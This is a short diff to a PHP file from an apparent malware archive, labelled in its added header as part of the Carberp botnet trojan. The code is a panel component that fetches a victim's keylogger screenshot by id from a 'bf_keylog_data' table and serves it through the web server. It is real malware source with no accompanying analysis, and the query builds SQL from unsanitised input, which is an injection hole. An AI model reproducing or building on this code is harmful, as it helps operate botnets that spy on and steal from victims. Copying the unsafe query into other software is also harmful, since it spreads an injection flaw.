@@ -1,8 +1,21 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT id, screen FROM bf_keylog_data WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
+if(!empty($Cur['id'])){
+	$item = $mysqli->query('SELECT id, screen FROM bf_keylog_data WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
 
-	if($item->id == $Cur['id']){		header("Content-Type: image/jpeg");
+	if($item->id == $Cur['id']){
+		header("Content-Type: image/jpeg");
 
     	if(file_exists('logs/keylogs/' . $item->screen)){
 			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
@@ -10,7 +23,8 @@ if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT id, screen FROM bf_keylo
 			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
 				header('X-Sendfile: ' . realpath('logs/keylogs/' . $item->screen));
 			}
-		}else{			exit('NOT_FOUND');
+		}else{
+			exit('NOT_FOUND');
 		}
 	}
 }
